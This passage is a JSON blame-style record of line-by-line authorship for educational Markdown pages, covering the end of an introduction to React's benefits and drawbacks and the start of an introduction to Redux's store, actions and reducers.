        "lineNumber": 108,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "Now that we know what React is, let us look at some benefits it has to offer."
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Benefit 1: Better Performance"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "Web applications can have a lot of user interaction and data updates, which results in changes being made to the \u003ctooltip content\u003d\"The Document Object Model, or the \u0027DOM\u0027, is an interface to web pages. It represents the page as nodes and objects, allowing programs to read and manipulate the page\u0027s content, structure, and styles.\"\u003eDOM\u003c/tooltip\u003e. Adding and removing DOM nodes isn\u0027t slow, but the performance-bottleneck arises because the browser needs to \u003ctooltip content\u003d\"A reflow occurs when the structure of the DOM tree changes, and a repaint occurs on style changes. These operations can get quite expensive for large DOM trees.\"\u003e*[reflow and repaint](https://www.phpied.com/rendering-repaint-reflowrelayout-restyle/)*\u003c/tooltip\u003e the UI every time the DOM is changed."
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "React minimizes this update time by using a *virtual DOM*. The virtual DOM is a JavaScript object that is kept in the memory of your application."
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "![React\u0027s Virtual DOM](javascript-framework-react-images/ReactVirtualDOM.png \"React\u0027s Virtual DOM\")"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "_Figure 1. How React\u0027s actual DOM gets updated._"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "As shown in Figure 1 above, updates to the UI will first be made to the virtual DOM. Then, React will compare the virtual DOM with the actual DOM using a *[diffing algorithm](https://reactjs.org/docs/reconciliation.html#the-diffing-algorithm)*. "
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "Finally, React updates the actual DOM only in places it differs with the virtual DOM. It batches multiple changes together and updates the actual DOM in one go, minimizing update time. "
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Benefit 2: Abstraction"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "The traditional \u003ctooltip content\u003d\"Imperative programming focuses on explicitly describing how a program operates.\"\u003e*imperative*\u003c/tooltip\u003e approach of building a web application requires you to describe how you want your UI to change when your application data changes. "
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "Most web applications usually have to interact with a lot of DOM elements and events. Also, different browsers have variations in their implementations of the \u003ctooltip content\u003d\"The core DOM consists of the properties and methods of the DOM (nodeName, getElementById(), etc).\"\u003e[core DOM](https://quirksmode.org/dom/core/)\u003c/tooltip\u003e, \u003ctooltip content\u003d\"The events system consists of different kinds of events that the DOM supports (blur, change, etc).\"\u003e[events system](https://www.quirksmode.org/dom/events/index.html)\u003c/tooltip\u003e and even [styles](https://www.quirksmode.org/dom/w3c_css.html) that can be applied to DOM elements! If you want your application to work across different browsers, you would need to manually take care of these variations with the imperative approach. "
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "React\u0027s declarative approach simplifies this process because it abstracts the complexity of interacting with the actual DOM elements and events. For example, the virtual DOM helps React abstract browser-specific operations on DOM elements. Additionally, React provides its own [events system](https://reactjs.org/docs/events.html) so that events can work in the same way across different browsers."
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Benefit 3: Testability"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "A React application is made up of a combination of components. Components are independent from each other, and like functions, they map the same input to the same output. This makes it easy to write unit tests for your application."
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "Additionally, React only allows data to flow downwards (one-way data binding) using `state` and `props`, which makes your application [easier to debug](https://reactjs.org/docs/design-principles.html#debugging) as you can be sure that the data updates the UI, and never the other way around. "
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Other Advantages of React"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "Besides the three main benefits explained above, React has the following advantages:"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": " - React is not an \u003ctooltip content\u003d\"An opiniated framework guides or locks you into their preferred way of doing things.\"\u003e*opinionated*\u003c/tooltip\u003e framework, which gives you the flexibility to choose your application stack."
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": " - React is constantly being updated with new features (e.g. [hooks](https://reactjs.org/docs/hooks-intro.html) were released in v16.8) and performance optimizations."
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Disadvantages of React"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": ""
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "Like any other framework/library, React has its share of disadvantages."
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "1. **Fast-Paced Development:** \u003cbr/\u003e"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "The high pace of development of React means that you would need to regularly relearn how to do things."
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": " 2. **React is Just a UI library:**\u003cbr/\u003e"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "As React only allows one-way data binding, you can\u0027t use it in applications that follow the \u003ctooltip content\u003d\"MVC, or Model-View-Controller is a popular application structure for building web applications. It separates the UI and the data of your application, and changes can be made to your application using controllers.\"\u003e*MVC*\u003c/tooltip\u003e architecture. You would have to use [Flux](https://github.com/facebook/flux), an application architecture that favors one-way data binding instead."
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## React and Other Competing Alternatives"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "There are a lot of JavaScript frameworks and libraries that you can use to build your next web application. Some popular alternatives to React are [Angular](https://se-education.org/learningresources/contents/javascript/Javascript-framework-Angular.html) and [Vue](https://se-education.org/learningresources/contents/javascript/Javascript-framework-VueJs.html)."
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "How do you decide which one to use? Here are some resources to help you choose between them:"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "- [React, Angular, Vue: What they can do and which one is for you](https://blog.teamtreehouse.com/react-angular-vue) - This article has guidelines for choosing which technology to learn."
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "- [Angular vs Vue vs React](https://www.codeinwp.com/blog/angular-vs-vue-vs-react/) - In addition to comparing the three technologies, this article aims to give a general structure for comparing JavaScript frameworks and libraries. Hence, you can use this structure to choose between any new frameworks that may arrive in the future."
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "- [State of JS 2018: Front-end Frameworks](https://2018.stateofjs.com/front-end-frameworks/overview/) - This survey compares the average salaries, company size, developer satisfaction, etc. for the most used JavaScript front-end technologies, so you can decide which technology will be worth learning for a career in front-end software engineering."
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "Every framework has its pros and cons, but hopefully you have managed to see that React [removes some of the complexity](https://jlongster.com/Removing-User-Interface-Complexity,-or-Why-React-is-Awesome) that comes with building user interfaces. "
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Getting Started With React"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "The official React [website](https://reactjs.org/) is a great place to get started. It includes:"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": " - A step-by-step [tutorial](https://reactjs.org/tutorial/tutorial.html) for building a React application, if you prefer to learn by doing."
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": " - A [guide](https://reactjs.org/docs/hello-world.html) to master the main concepts of React, if you prefer to learn by reading instead."
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": " "
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "If you want to add React to an existing project, you can take a look at React\u0027s official [guide](https://reactjs.org/docs/add-react-to-a-website.html) for doing so. Alternatively, if you are creating a new React application, you can use one of the [recommended toolchains](https://reactjs.org/docs/create-a-new-react-app.html) to get the best user and developer experience."
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "[Create React App](https://github.com/facebook/create-react-app) is a convenient environment for learning React, and it is the recommended way to create \u003ctooltip content\u003d\"A single-page application is an app that works inside a browser and does not require page reloading during use.\"\u003e*single-page applications*\u003c/tooltip\u003e with React."
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "The official website also has [advanced guides](https://reactjs.org/docs/getting-started.html#advanced-concepts) if you want to understand how React works behind the scenes."
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Resources"
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": "As React is a fairly popular library, you can find a lot of comprehensive resources online. Here are some resources that can be useful:"
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": " - [The React Handbook](https://medium.freecodecamp.org/the-react-handbook-b71c27b0a795) - This article provides a well-rounded overview of React."
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": " - A list of officially [recommended courses](https://reactjs.org/community/courses.html) (some of which are free) - You can learn React from one of these resources if you prefer third-party books or video tutorials. "
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": " - The React [Blog](https://reactjs.org/blog/) - Updates about React\u0027s latest features will be available here."
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": " - React\u0027s [API Reference](https://reactjs.org/docs/react-api.html) - You can learn more about React\u0027s API here."
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": " - The [React DevTools](https://github.com/facebook/react-devtools) browser extension - This is used for inspecting and debugging React applications from within your browser\u0027s developer tools."
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": " \u003c/box\u003e"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": "If you need help with React, you can get support from React\u0027s [community](https://reactjs.org/community/support.html) of millions of developers that are active on [Stack Overflow](https://stackoverflow.com/questions/tagged/reactjs)"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": "and discussion forums like [Dev](https://dev.to/t/react) and [Hashnode](https://hashnode.com/n/reactjs)."
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": "Lastly, if you want to know what to learn after getting familiar with React, [here is a comprehensive roadmap](https://github.com/adam-golab/react-developer-roadmap) that you can follow to become a full-fledged React developer."
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "niqiukun": 6,
      "Tejas2805": 26,
      "-": 157
    }
  },
  {
    "path": "contents/javascript/Javascript-framework-Redux.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  title: Redux"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  pageNav: 2"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  "
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "# Introduction to Redux"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "**Author: [Labayna Neil Brian Narido](https://github.com/nbriannl)** \u003cbr\u003e"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "Reviewers: [Ang Ze Yu](https://www.github.com/ang-zeyu), [Yash Chowdhary](https://www.github.com/yash-chowdhary), [James Pang Mun Wai](https://www.github.com/jamessspanggg)"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003cbox type\u003d\"info\" light\u003e"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  This chapter does \u003cb\u003enot\u003c/b\u003e assume the reader has knowledge of frontend frameworks. However, knowing a frontend framework, such as \u003ca href\u003d\"{{baseUrl}}/contents/javascript/Javascript-framework-React.html\"\u003eReact\u003c/a\u003e can lead to a better understanding of this chapter."
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003c!-- update table of contents here --\u003e"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "* [Introduction to Redux‎](#introduction-to-go)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  * [What Is Redux?](#what-is-redux)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  * [How Does Redux Work?](#how-does-redux-work)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  * [Why Use Redux?](#why-use-redux)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  * [When Not to Use Redux?](#why-not-to-use-redux)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  * [Getting Started with Redux](#getting-started-with-redux)"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  * [References/Further Reading](#references-further-reading)"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "## What is Redux?"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "_(This section is adapted from this [Medium article](https://medium.com/javascript-in-plain-english/the-only-introduction-to-redux-and-react-redux-youll-ever-need-8ce5da9e53c6) by Hristijan Stevanoski)_"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "To understand what Redux is, we have to understand what application state is."
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "You can think of application state like a global object holding information that you will use for various purposes in your application. "
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003cbox light header\u003d\"Examples of application states\"\u003e"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "- For a general application you would need to keep track of whether a user is logged in and their user information"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "- For a to-do list you would need to know what items are currently in the list"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "- For a social media application you\u0027d need to store serveral objects and arrays representing the stories to render in the News Feed"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "However, modern web applications often have large amounts of state. In such applications, state is likely to be shared between components and updated from various parts of the code, making state less predictable. This is where Redux comes into the picture. "
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "**Redux** is a library that manages application state for Javascript applications. You can use it together with view libraries such as \u003ctooltip content\u003d\"via React Redux\" placement\u003d\"top\"\u003e[React](https://react-redux.js.org/)\u003c/tooltip\u003e and \u003ctooltip content\u003d\"via vuejs-redux\" placement\u003d\"top\"\u003e[Vue](https://github.com/titouancreach/vuejs-redux)\u003c/tooltip\u003e."
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "The [official website](https://redux.js.org/introduction/getting-started) describes Redux as follows:"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003e *Redux* is a predictable state container for JavaScript apps."
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003e"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003e It helps you write applications that behave consistently, run in different environments (client, server, and native), and are easy to test. On top of that, it provides a great developer experience, such as live code editing combined with a time traveling debugger."
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003e"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003e You can use Redux together with React, or with any other view library. It is tiny (2kB, including dependencies), but has a large ecosystem of addons available."
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "## How Does Redux Work?"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "The structure of Redux is relatively simple. Consisting of three components, Store, Actions and Reducer."
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003ccenter\u003e"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003cimg src\u003d\"javascript-framework-redux-images/3basiccomponents.png\" width\u003d\"650\"\u003e"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "_The three building blocks of Redux — Store, Actions and Reducer_"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003c/center\u003e"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "For this section, let\u0027s use a simple to-do list application as an example."
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "The whole application state is stored in a single **store**, a plain object."
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "```js"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "{"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  todos: [{"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "    text: \u0027Eat food\u0027,"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "    completed: true"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  }, {"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "    text: \u0027Exercise\u0027,"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "    completed: false"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  }],"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  visibilityFilter: \u0027SHOW_COMPLETED\u0027"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "}"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "```"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "Information in the store is used for various application functionality, such as the App UI. For example, based on the array under `todos`, we can render a to-do list of tasks. Based on the `visibilityFilter`, the application decides whether to render incompleted tasks. "
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "The only way to change data in the state is by dispatching an **action**, which is a plain object as well. Actions must have a `type` property indicating the type of action being performed."
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "```js"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "{ type: \u0027ADD_TODO\u0027, text: \u0027Go to swimming pool\u0027 }"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "{ type: \u0027TOGGLE_TODO\u0027, index: 1 }"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "{ type: \u0027SET_VISIBILITY_FILTER\u0027, filter: \u0027SHOW_ALL\u0027 }"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "```"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "Actions can be dispatched from user interactions in the application, such as button click events. For example, in our to-do list application, an `ADD_TODO` action could be dispatched when our the user fills up a task \u0027Go to swimming pool\u0027 and clicks an \u0027Add To-do\u0027 button."
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "The current state, and an action is passed into a **reducer**, a function which returns the next state of the application"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "With the updated application state, the application will reflect the new information in the store accordingly. For example, it may render new tasks, or render incomplete tasks instead of completed tasks."
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "Reducers are \u003ctooltip content\u003d\"A pure function is a function which: Given the same input, will always return the same output. And produces no side effects.\"\u003epure functions\u003c/tooltip\u003e. They take the previous state and an action, and return the next state as new state objects, instead of mutating the previous state."
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "For easier readability, the following code block examples on reducers are not pure functions. If you\u0027re interested, you may see how the reducers should actually be written in the [official Redux site](https://redux.js.org/basics/reducers/#source-code). The code in the link includes some Redux API, and Javascript methods such as [`.map`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/map) and the [spread operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax) to make the functions pure. But knowing the actual syntax for Redux is not the main focus of this introductory article."
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "In a real-world application with a large and complex application state, having a single reducer to manage multiple parts of the state may get confusing and complicated. We can have multiple, simpler reducers instead, and combine them into one reducer."
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "For example, we have two simpler reducers."
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "Firstly, a reducer for the visibility filter `visibilityFilter`:"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "nbriannl"
